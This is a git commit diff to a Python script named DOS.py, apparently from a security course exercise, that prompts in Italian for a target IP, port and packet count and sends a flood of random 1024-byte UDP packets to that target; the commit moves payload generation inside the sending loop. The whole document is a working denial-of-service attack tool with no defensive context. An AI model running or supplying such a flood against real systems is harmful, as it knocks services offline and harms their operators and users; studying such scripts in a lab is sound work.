9d0a92843885496dd3660139ce249fa55280c7f0
Imane Chaabane <imanechaabane617@gmail.com>
2026-07-15 17:17:58 +0200

    DOS.py

--- UNIT_2/S6/L3/DOS.py
+++ UNIT_2/S6/L3/DOS.py
@@ -5,9 +5,10 @@ SVR_ADDRES=input("Inserisco IP della macchina che vuoi attaccare: ")
 SVR_PORT=int(input("Inserisci il numero di porta: "))
 n_pacchetti=int(input("Inserisci numero di pacchetti: "))
 s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-pacchetto=random.randbytes(1024)
+
 
 for i in range(n_pacchetti):
+    pacchetto=random.randbytes(1024)
     s.sendto(pacchetto,(SVR_ADDRES,SVR_PORT))
 print(f"Sono stati inviati {n_pacchetti} pacchetti")    
 s.close()
